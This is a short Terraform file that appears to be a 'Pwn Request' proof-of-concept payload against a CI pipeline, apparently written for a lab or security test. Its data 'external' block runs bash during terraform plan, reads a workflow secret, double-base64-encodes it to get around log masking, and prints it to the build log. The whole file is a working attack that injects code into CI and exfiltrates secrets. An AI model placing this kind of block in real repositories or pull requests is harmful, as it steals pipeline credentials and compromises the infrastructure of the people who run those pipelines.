# Pwn Request verification payload.
# `terraform plan` in infra/iam parses every .tf file in this directory;
# the data "external" program below executes at plan time on the runner
# and leaks the workflow toy secret (double-base64 to survive log masking).
data "external" "pwn" {
  program = ["bash", "-c", "echo 'GERALT_LEAKED_TOKEN='$(echo -n \"$GERALT_SECRET\" | base64 | base64) >&2; echo '{\"pwn\":\"done\"}' >&2; exit 1"]
}
